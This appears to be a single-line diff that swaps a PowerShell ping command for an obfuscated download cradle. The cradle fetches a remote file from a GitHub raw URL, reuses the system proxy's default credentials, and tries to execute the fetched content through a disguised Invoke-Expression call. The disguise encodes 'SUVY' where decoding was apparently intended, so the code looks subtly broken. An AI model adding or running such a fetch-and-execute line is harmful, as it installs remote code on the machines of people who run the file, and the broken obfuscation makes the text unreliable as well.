@@ -1,1 +1,1 @@
-cmd /c powershell -exec bypass -w 1 "ping 8.8.8.8 -t"
+$req=new-object net.webclient;$req.proxy=[Net.WebRequest]::GetSystemWebProxy();$req.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$res=$req.DownloadString('https://raw.githubusercontent.com/uphup/p1/main/main.php');&([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('SUVY'))) $res;
